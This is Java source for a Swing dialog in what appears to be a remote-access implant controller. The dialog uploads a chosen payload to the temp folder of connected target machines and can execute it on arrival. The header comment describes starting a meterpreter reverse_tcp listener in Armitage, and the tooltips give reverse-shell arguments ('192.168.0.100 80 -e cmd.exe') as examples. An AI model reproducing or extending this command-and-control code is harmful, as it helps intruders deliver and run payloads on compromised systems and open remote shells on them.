/**
 * The purpose of this class is to query the user on the controller which file do they with to select for upload
 * 
 * The end result of this class calls the File Sender class that handles reading the file in chunks, base 64 encoding it, 
 * encrypting it if encryption is enabled, and finaly transmitting the file to the recipient
 * 
 * 
 * to start the meterpreter listener:
 * 
 * From Armitage: Payloads --> windows --> meterpreter --> reverse_tcp and double click the multi/handler to start the listener
 * Special thanks to Raphael Mudge!
 * 
 * @author Solomon Sonya
 */

package Dialogs;

import Controller.Drivers.Drivers;
import Controller.GUI.JPanel_MainControllerWindow;
import Controller.Thread.Thread_Terminal;
import Implant.Driver;
import Implant.FTP.Encoded_File_Transfer.File_Sender;

import java.awt.*;

import javax.swing.*;
import javax.swing.border.Border;
import javax.swing.Timer;
import java.awt.Dialog.ModalityType;
import java.awt.event.*;
import java.io.File;
import java.util.ArrayList;

public class Dialog_File_Or_Payload_Upload extends JDialog implements ActionListener
{
	public static final String myClassName = "Dialog_File_Or_Payload_Upload";
	JPanel_MainControllerWindow parent = null;
	
	
	
	public File fleUpload = null;
	public String fileName = "";
	public String uploadSaveDirectoryOnTarget = "%temp%";
	public String executionArguments = "";
	public String executionCommand = "";
	public String executionPreamble = "";
	
	public static final int load_index_upload_file = 0; //file transfer any file
	public static final int load_index_upload_payload = 1;//transfer any file and attempt to execute it with arguments at the end
	
	public String title = "";
	public String file_specification = "Payload";
	
	public JLabel jlblTitle = new JLabel("Payload Migration", SwingConstants.CENTER);
	public JButton jbtnSpecifyPayloadToUpload = new JButton("Specify Payload to Upload");
	
	public JTextField jtfSpecifyPayloadToUpload;
	public JTextField jtfSpecifyPayloadNameOnTarget;
	public final JTextField jtfSpecifyPayloadSave = new JTextField();
	private final JTextField jtfSpecifyPayloadExecution = new JTextField();
	public final JTextField jtfSpecifyFullPayload = new JTextField();
	
	public JRadioButton jrbYes = new JRadioButton("Yes", true);
	public JRadioButton jrbNo = new JRadioButton("No", false);
	public ButtonGroup button_group = new ButtonGroup();
	public JLabel jlblNewLabel = new JLabel("Execute Payload Upon Upload Completion:");
	public JLabel jlblSpecifyPayloadSave = new JLabel("Specify Payload Save Directory on Target:");
	public JLabel jlblSpecifyPayloadNameOnTarget = new JLabel("Specify Payload Name on Target: ");
	public JLabel jlblSpecifyPayloadExecution = new JLabel("Specify Payload Execution Arguments:");
	public JButton jbtnCheckArguments = new JButton("Check Arguments");
	public JButton jbtnLaunch = new JButton("Launch");
	private JTextField jtfExecutionPreamble = new JTextField();
	
	public Dialog_File_Or_Payload_Upload(JPanel_MainControllerWindow par, int load_index)
	{
		try
		{
			//parent.connectHit = false;
			parent = par;
			this.setTitle("Payload Migration");			
			//this.setLayout(new BorderLayout());
			
			
			if(load_index == load_index_upload_payload)
			{
				title = "Payload Migration To Target Machine";
				file_specification = "Payload";
			}
			else if(load_index == load_index_upload_payload)
			{
				title = "File Upload to Destination System";
				file_specification = "File";
			}
			else
			{
				title = "File Upload to Destination System";
				file_specification = "File";
			}
			
						
			this.setTitle(title);
			this.setBounds(300, 100, 761, 307);		
			setResizable(false);
			this.setModaling();			
			Drivers.setJFrameIcon(this);
			getContentPane().setLayout(null);
			
			
			jlblTitle.setFont(new Font("Tahoma", Font.BOLD, 16));
			jlblTitle.setBounds(23, 11, 722, 28);
			getContentPane().add(jlblTitle);
			
			
			jbtnSpecifyPayloadToUpload.setBounds(23, 50, 208, 23);
			getContentPane().add(jbtnSpecifyPayloadToUpload);
			
			jtfSpecifyPayloadToUpload = new JTextField();
			jtfSpecifyPayloadToUpload.setEditable(false);
			jtfSpecifyPayloadToUpload.setBounds(239, 51, 506, 20);
			getContentPane().add(jtfSpecifyPayloadToUpload);
			jtfSpecifyPayloadToUpload.setColumns(10);
			
			jtfSpecifyPayloadNameOnTarget = new JTextField();
			jtfSpecifyPayloadNameOnTarget.setEditable(false);
			jtfSpecifyPayloadNameOnTarget.setColumns(10);
			jtfSpecifyPayloadNameOnTarget.setBounds(239, 116, 506, 20);
			getContentPane().add(jtfSpecifyPayloadNameOnTarget);
			jtfSpecifyPayloadSave.setEditable(false);
			jtfSpecifyPayloadSave.setColumns(10);
			jtfSpecifyPayloadSave.setBounds(239, 85, 506, 20);
			
			getContentPane().add(jtfSpecifyPayloadSave);
			jtfSpecifyPayloadExecution.setToolTipText("Optional Field. Example: 192.168.0.100 80 -e cmd.exe.  If unsure, leave blank");
			jtfSpecifyPayloadExecution.setColumns(10);
			jtfSpecifyPayloadExecution.setBounds(239, 143, 506, 20);
			
			getContentPane().add(jtfSpecifyPayloadExecution);
			jtfSpecifyFullPayload.setColumns(10);
			jtfSpecifyFullPayload.setBounds(239, 203, 506, 20);
			
			getContentPane().add(jtfSpecifyFullPayload);
			
			
			jrbYes.setBounds(239, 230, 43, 23);
			jrbNo.setBounds(289, 230, 43, 23);
			button_group.add(jrbYes);
			button_group.add(jrbNo);
			getContentPane().add(jrbYes);
			getContentPane().add(jrbNo);
			jlblNewLabel.setBounds(26, 234, 208, 14);
			
			getContentPane().add(jlblNewLabel);
			jlblSpecifyPayloadSave.setBounds(26, 88, 208, 14);
			
			getContentPane().add(jlblSpecifyPayloadSave);
			jlblSpecifyPayloadNameOnTarget.setBounds(26, 119, 208, 14);
			
			getContentPane().add(jlblSpecifyPayloadNameOnTarget);
			jlblSpecifyPayloadExecution.setToolTipText("\r\nOptional Field. Example: 192.168.0.100 80 -e cmd.exe.  If unsure, leave blank");
			jlblSpecifyPayloadExecution.setBounds(26, 146, 208, 14);
			
			getContentPane().add(jlblSpecifyPayloadExecution);
			jbtnCheckArguments.setBounds(23, 202, 208, 23);
			
			getContentPane().add(jbtnCheckArguments);
			jbtnLaunch.setBounds(339, 230, 406, 23);
			
			getContentPane().add(jbtnLaunch);
			
			JLabel jlblExecutionPreamble = new JLabel("Specify Execution Preamble (If Appliable):");
			jlblExecutionPreamble.setToolTipText("This is an optional field. Examples: java -jar... If unsure, leave blank");
			jlblExecutionPreamble.setBounds(26, 177, 208, 14);
			getContentPane().add(jlblExecutionPreamble);
			
			
			jtfExecutionPreamble.setToolTipText("This is an optional field. Examples: java -jar... If unsure, leave blank");
			jtfExecutionPreamble.setColumns(10);
			jtfExecutionPreamble.setBounds(239, 174, 506, 20);
			getContentPane().add(jtfExecutionPreamble);
			
			this.jbtnCheckArguments.addActionListener(this);
			this.jbtnLaunch.addActionListener(this);
			this.jbtnSpecifyPayloadToUpload.addActionListener(this);
			
		}
		catch(Exception e)
		{
			Driver.eop("Constructor", myClassName, e, "", false);
		}
	}

	public boolean setModaling()
	{
		try
		{			
			this.setModal(true);
			//this.setAlwaysOnTop(true);
			this.setModalityType (ModalityType.APPLICATION_MODAL);
			
			return true;
		}
		catch(Exception ee){Driver.sop("in " + this.myClassName + " could not set modaling");}
		
		return false;
	}
	
	public boolean checkArguments()
	{
		try
		{
			if(this.fleUpload != null && this.fleUpload.exists() && this.fleUpload.isFile())
			{
				this.fileName = Driver.getFileName_From_FullPath(fleUpload);
				jtfSpecifyPayloadSave.setText(uploadSaveDirectoryOnTarget);
				executionArguments = this.jtfSpecifyPayloadExecution.getText().trim();
				executionPreamble = this.jtfExecutionPreamble.getText().trim() + " ";
				
				this.jtfSpecifyFullPayload.setText(executionPreamble + this.uploadSaveDirectoryOnTarget + Driver.fileSeperator + fileName + " " + executionArguments.trim());
				
				executionCommand = jtfSpecifyFullPayload.getText().trim();
			}
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("checkArguments", myClassName, e, "", false);
		}
		
		return false;
	}
	
	public void actionPerformed(ActionEvent ae) 
	{
		try
		{
			if(ae.getSource() == this.jbtnCheckArguments)
			{
				checkArguments();
				
			}
			else if(ae.getSource() == this.jbtnLaunch)
			{
				this.checkArguments();
				if(this.fleUpload != null && this.fleUpload.exists() && this.fleUpload.isFile())
				{
					sendFile();	
					
					this.dispose();
				}
				else
				{
					Driver.jop_Error("Upload File Missing                         ", "Unable to Continue");
				}
				
				
			}
			else if(ae.getSource() == this.jbtnSpecifyPayloadToUpload)
			{
				fleUpload = Driver.querySelectFile(true, "Please Specify File to Transfer", JFileChooser.FILES_ONLY, false, false);
				fileName = "";
				
				if(fleUpload != null && fleUpload.exists()&& fleUpload.isFile())
				{
					this.jtfSpecifyPayloadToUpload.setText("" + fleUpload.getCanonicalPath().trim());
					
					fileName = Driver.getFileName_From_FullPath(fleUpload);
					
					this.jtfSpecifyPayloadNameOnTarget.setText(fileName);
					jtfSpecifyPayloadSave.setText(uploadSaveDirectoryOnTarget);
				}
				
				else
				{
					if(fleUpload != null && fleUpload.exists() && fleUpload.isFile())
					{
						this.jtfSpecifyPayloadToUpload.setText("" + fleUpload.getCanonicalPath().trim());
					}
					else
					{
						this.jtfSpecifyPayloadToUpload.setText("");
						this.jtfSpecifyPayloadNameOnTarget.setText("");
						jtfSpecifyPayloadSave.setText("");
					}
				}
				
			}
			
			
		}
		catch(Exception e)
		{
			Driver.eop("ae", myClassName, e, "", false);
		}		
	}
	
	public boolean sendFile()
	{
		try
		{
			//Ensure we have implants to broadcast to
			if(Drivers.alTerminals.size() < 1)
			{
				Drivers.jop_Error("No implants are connected", "Can't Execute Command");
				return false;
			}
			else
			{
				ArrayList<Thread_Terminal> clients = Drivers.getSelectedClients(parent);
				
				if(clients == null)
				{
					clients = Drivers.alTerminals;
				}
				
				Thread_Terminal terminal = null;
				
				for(int i = 0; i < clients.size(); i++)
				{
					terminal = clients.get(i);
					
					if(terminal == null)
						continue;
					
					File_Sender fileSender = new File_Sender(terminal, this.fleUpload, this.uploadSaveDirectoryOnTarget, this.fileName, this.executionArguments, executionCommand, this.jrbYes.isSelected(), executionPreamble, terminal.getRHOST_IP());
					
				}
				
				
			}
			
			
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("migrateFile", myClassName, e, "", false);
		}
		
		return false;
	}
}
